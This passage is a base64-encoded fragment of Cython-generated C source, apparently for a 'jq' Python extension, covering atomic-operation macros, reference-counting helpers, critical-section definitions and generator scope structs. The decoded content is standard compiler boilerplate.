VmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSBzdGQ6OmF0b21pY191aW50cHRyX3RcbiAgICAjZGVmaW5lIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSB1aW50cHRyX3RcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfYWNxX3JlbClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX3N1Yl9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfYWNxX3JlbClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgc3RkOjphdG9taWNfZmV0Y2hfc3ViKHZhbHVlLCBhcmcpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIHN0ZDo6YXRvbWljX2NvbXBhcmVfZXhjaGFuZ2Vfc3Ryb25nKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19sb2FkKHZhbHVlKSBzdGQ6OmF0b21pY19sb2FkKHZhbHVlKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIHN0ZDo6YXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIHN0ZDo6YXRvbWljX2xvYWRfZXhwbGljaXQodmFsdWUsIHN0ZDo6bWVtb3J5X29yZGVyX3JlbGF4ZWQpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX2FjcXVpcmUodmFsdWUpIHN0ZDo6YXRvbWljX2xvYWRfZXhwbGljaXQodmFsdWUsIHN0ZDo6bWVtb3J5X29yZGVyX2FjcXVpcmUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBzdGQ6OmF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpXG4gICAgI2lmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUykgJiYgZGVmaW5lZChfTVNDX1ZFUilcbiAgICAgICAgI3ByYWdtYSBtZXNzYWdlICgiVXNpbmcgc3RhbmRhcmQgQysrIGF0b21pY3MiKVxuICAgICNlbGlmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUylcbiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIHN0YW5kYXJkIEMrKyBhdG9taWNzIlxuICAgICNlbmRpZlxuI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKF9fR05VQ19fID49IDUgfHwgKF9fR05VQ19fID09IDQgJiZcXFxuICAgICAgICAgICAgICAgICAgICAoX19HTlVDX01JTk9SX18gPiAxIHx8XFxcbiAgICAgICAgICAgICAgICAgICAgKF9fR05VQ19NSU5PUl9fID09IDEgJiYgX19HTlVDX1BBVENITEVWRUxfXyA+PSAyKSkpKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIHZvaWQqXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfYWRkKHZhbHVlLCAxKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9zdWIodmFsdWUsIDEpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCBhcmcpXG4gICAgc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19pbnRfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBkZXNpcmVkKSB7XG4gICAgICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBvbGQgPSBfX3N5bmNfdmFsX2NvbXBhcmVfYW5kX3N3YXAodmFsdWUsICpleHBlY3RlZCwgZGVzaXJlZCk7XG4gICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkO1xuICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfYWRkKHZhbHVlLCAwKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIF9fc3luY19sb2NrX3Rlc3RfYW5kX3NldCh2YWx1ZSwgbmV3X3ZhbHVlKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDApXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBfX3N5bmNfbG9ja190ZXN0X2FuZF9zZXQodmFsdWUsIChfX3B5eF9hdG9taWNfcHRyX3R5cGUpbmV3X3ZhbHVlKVxuICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTXG4gICAgICAgICN3YXJuaW5nICJVc2luZyBHTlUgYXRvbWljcyJcbiAgICAjZW5kaWZcbiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIGRlZmluZWQoX01TQ19WRVIpXG4gICAgI2luY2x1ZGUgPGludHJpbi5oPlxuICAgICN1bmRlZiBfX3B5eF9hdG9taWNfaW50X3R5cGVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBsb25nXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgdm9pZCpcbiAgICAjdW5kZWYgX19weXhfbm9uYXRvbWljX2ludF90eXBlXG4gICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgbG9uZ1xuICAgICNwcmFnbWEgaW50cmluc2ljIChfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCwgX0ludGVybG9ja2VkRXhjaGFuZ2UsIF9JbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZSwgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlUG9pbnRlciwgX0ludGVybG9ja2VkRXhjaGFuZ2VQb2ludGVyKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIDEpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAtMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIC1hcmcpXG4gICAgc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19pbnRfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBkZXNpcmVkKSB7XG4gICAgICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBvbGQgPSBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2UodmFsdWUsIGRlc2lyZWQsICpleHBlY3RlZCk7XG4gICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkO1xuICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAwKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpICoodm9pZCAqIHZvbGF0aWxlICopdmFsdWVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlUG9pbnRlcih2YWx1ZSwgMCwgMClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlUG9pbnRlcih2YWx1ZSwgKF9fcHl4X2F0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpXG4gICAgI2lmZGVmIF9fUFlYX0RFQlVHX0FUT01JQ1NcbiAgICAgICAgI3ByYWdtYSBtZXNzYWdlICgiVXNpbmcgTVNWQyBhdG9taWNzIilcbiAgICAjZW5kaWZcbiNlbHNlXG4gICAgI3VuZGVmIENZVEhPTl9BVE9NSUNTXG4gICAgI2RlZmluZSBDWVRIT05fQVRPTUlDUyAwXG4gICAgI2lmZGVmIF9fUFlYX0RFQlVHX0FUT01JQ1NcbiAgICAgICAgI3dhcm5pbmcgIk5vdCB1c2luZyBhdG9taWNzIlxuICAgICNlbmRpZlxuI2VuZGlmXG4jaWYgQ1lUSE9OX0FUT01JQ1NcbiAgICAjZGVmaW5lIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVxcXG4gICAgICAgICAgICAgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSlcbiAgICAjZGVmaW5lIF9fcHl4X3N1Yl9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVxcXG4gICAgICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpKVxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVxcXG4gICAgICAgICAgICBfX3B5eF9hZGRfYWNxdWlzaXRpb25fY291bnRfbG9ja2VkKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpLCBtZW12aWV3LT5sb2NrKVxuICAgICNkZWZpbmUgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXFxcbiAgICAgICAgICAgIF9fcHl4X3N1Yl9hY3F1aXNpdGlvbl9jb3VudF9sb2NrZWQoX19weXhfZ2V0X3NsaWNlX2NvdW50X3BvaW50ZXIobWVtdmlldyksIG1lbXZpZXctPmxvY2spXG4jZW5kaWZcblxuXG4jaW5jbHVkZSA8c3RydWN0bWVtYmVyLmg+XG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbiB2b2lkKlxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbjIgdm9pZCpcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4xKGNzLCBhcmcpICh2b2lkKWNzXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMihjcywgYXJnMSwgYXJnMikgKHZvaWQpY3NcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMShjcylcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMihjcylcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uIFB5Q3JpdGljYWxTZWN0aW9uXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uMiBQeUNyaXRpY2FsU2VjdGlvbjJcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4xIFB5Q3JpdGljYWxTZWN0aW9uX0JlZ2luXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMiBQeUNyaXRpY2FsU2VjdGlvbjJfQmVnaW5cbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMSBQeUNyaXRpY2FsU2VjdGlvbl9FbmRcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMiBQeUNyaXRpY2FsU2VjdGlvbjJfRW5kXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG8pIHtcbiNkZWZpbmUgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKSB9XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT05cbiNkZWZpbmUgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04gUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT05cbiNlbmRpZlxuXG5cblxuXG5cblxuc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByO1xuc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjtcbnN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7XG5zdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByO1xuXG5cbnN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2k7XG59O1xuXG5cblxuc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2k7XG59O1xuXG5cblxuc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2k7XG59O1xuXG5cblxuc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgbG9uZyBfX3B5eF92X187XG59O1xuXG5cblxuXG5cbiNpZm5kZWYgQ1lUSE9OX1JFRk5BTk5ZXG4gICNkZWZpbmUgQ1lUSE9OX1JFRk5BTk5ZIDBcbiNlbmRpZlxuI2lmIENZVEhPTl9SRUZOQU5OWVxuICB0eXBlZGVmIHN0cnVjdCB7XG4gICAgdm9pZCAoKklOQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkRFQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkdPVFJFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkdJVkVSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpO1xuICAgIHZvaWQqICgqU2V0dXBDb250ZXh0KShjb25zdCBjaGFyKiwgUHlfc3NpemVfdCwgY29uc3QgY2hhciopO1xuICAgIHZvaWQgKCpGaW5pc2hDb250ZXh0KSh2b2lkKiopO1xuICB9IF9fUHl4X1JlZk5hbm55QVBJU3RydWN0O1xuICBzdGF0aWMgX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKl9fUHl4X1JlZk5hbm55ID0gTlVMTDtcbiAgc3RhdGljIF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICpfX1B5eF9SZWZOYW5ueUltcG9ydEFQSShjb25zdCBjaGFyICptb2RuYW1lKTtcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucyB2b2lkICpfX3B5eF9yZWZuYW5ueSA9IE5VTEw7XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQobmFtZSwgYWNxdWlyZV9naWwpXFxcbiAgICAgICAgICBpZiAoYWNxdWlyZV9naWwpIHtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1NUQVRFIF9fcHl4X2dpbHN0YXRlX3NhdmUgPSBQeUdJTFN0YXRlX0Vuc3VyZSgpO1xcXG4gICAgICAgICAgICAgIF9fcHl4X3JlZm5hbm55ID0gX19QeXhfUmVmTmFubnktPlNldHVwQ29udGV4dCgobmFtZSksIChfX0xJTkVfXyksIChfX0ZJTEVfXykpO1xcXG4gICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcXFxuICAgICAgICAgIH0gZWxzZSB7XFxcbiAgICAgICAgICAgICAgX19weXhfcmVmbmFubnkgPSBfX1B5eF9SZWZOYW5ueS0+U2V0dXBDb250ZXh0KChuYW1lKSwgKF9fTElORV9fKSwgKF9fRklMRV9fKSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKSB7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcXFxuICAgICAgICAgICAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKSB7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcXFxuICAgICAgICAgICAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KClcXFxuICAgICAgICAgIF9fUHl4X1JlZk5hbm55LT5GaW5pc2hDb250ZXh0KCZfX3B5eF9yZWZuYW5ueSlcbiAgI2RlZmluZSBfX1B5eF9JTkNSRUYocikgIF9fUHl4X1JlZk5hbm55LT5JTkNSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9ERUNSRUYocikgIF9fUHl4X1JlZk5hbm55LT5ERUNSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9HT1RSRUYocikgIF9fUHl4X1JlZk5hbm55LT5HT1RSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9HSVZFUkVGKHIpIF9fUHl4X1JlZk5hbm55LT5HSVZFUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpXG4gICNkZWZpbmUgX19QeXhfWElOQ1JFRihyKSAgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0lOQ1JFRihyKTsgfX0gd2hpbGUoMClcbiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpICBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfREVDUkVGKHIpOyB9fSB3aGlsZSgwKVxuICAjZGVmaW5lIF9fUHl4X1hHT1RSRUYocikgIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9HT1RSRUYocik7IH19IHdoaWxlKDApXG4gICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocikgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0dJVkVSRUYocik7fX0gd2hpbGUoMClcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dChuYW1lLCBhY3F1aXJlX2dpbClcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpXG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KClcbiAgI2RlZmluZSBfX1B5eF9JTkNSRUYocikgUHlfSU5DUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfREVDUkVGKHIpIFB5X0RFQ1JFRihyKVxuICAjZGVmaW5lIF9fUHl4X0dPVFJFRihyKVxuICAjZGVmaW5lIF9fUHl4X0dJVkVSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YSU5DUkVGKHIpIFB5X1hJTkNSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpIFB5X1hERUNSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YR09UUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocilcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeV9YREVDUkVGX1NFVChyLCB2KSBkbyB7XFxcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1xcXG4gICAgICAgIHIgPSB2OyBQeV9YREVDUkVGKHRtcCk7XFxcbiAgICB9IHdoaWxlICgwKVxuI2RlZmluZSBfX1B5eF9YREVDUkVGX1NFVChyLCB2KSBkbyB7XFxcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1xcXG4gICAgICAgIHIgPSB2OyBfX1B5eF9YREVDUkVGKHRtcCk7XFxcbiAgICB9IHdoaWxlICgwKVxuI2RlZmluZSBfX1B5eF9ERUNSRUZfU0VUKHIsIHYpIGRvIHtcXFxuICAgICAgICBQeU9iamVjdCAqdG1wID0gKFB5T2JqZWN0ICopIHI7XFxcbiAgICAgICAgciA9IHY7IF9fUHl4X0RFQ1JFRih0bXApO1xcXG4gICAgfSB3aGlsZSAoMClcbiNkZWZpbmUgX19QeXhfQ0xFQVIocikgICAgZG8geyBQeU9iamVjdCogdG1wID0gKChQeU9iamVjdCopKHIpKTsgciA9IE5VTEw7IF9fUHl4X0RFQ1JFRih0bXApO30gd2hpbGUoMClcbiNkZWZpbmUgX19QeXhfWENMRUFSKHIpICAgZG8geyBpZigocikgIT0gTlVMTCkge1B5T2JqZWN0KiB0bXAgPSAoKFB5T2JqZWN0KikocikpOyByID0gTlVMTDsgX19QeXhfREVDUkVGKHRtcCk7fX0gd2hpbGUoMClcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoZXJyKSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShfX3B5eF90c3RhdGUsIGVycilcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShQeVRocmVhZFN0YXRlKiB0c3RhdGUsIFB5T2JqZWN0KiBlcnIpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhlcnIpICBQeUVycl9FeGNlcHRpb25NYXRjaGVzKGVycilcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlICBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGU7XG4jZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduICBfX3B5eF90c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiAhPSBOVUxMKVxuI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA/IChQeU9iamVjdCopIFB5X1RZUEUoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbikgOiAoUHlPYmplY3QqKSBOVUxMKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUgIT0gTlVMTClcbiNkZWZpbmUgX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUpXG4jZW5kaWZcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoUHlFcnJfT2NjdXJyZWQoKSAhPSBOVUxMKVxuI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICBQeUVycl9PY2N1cnJlZCgpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgX19QeXhfRXJyUmVzdG9yZShOVUxMLCBOVUxMLCBOVUxMKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGVfR0VUKCksIHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgICBfX1B5eF9FcnJGZXRjaEluU3R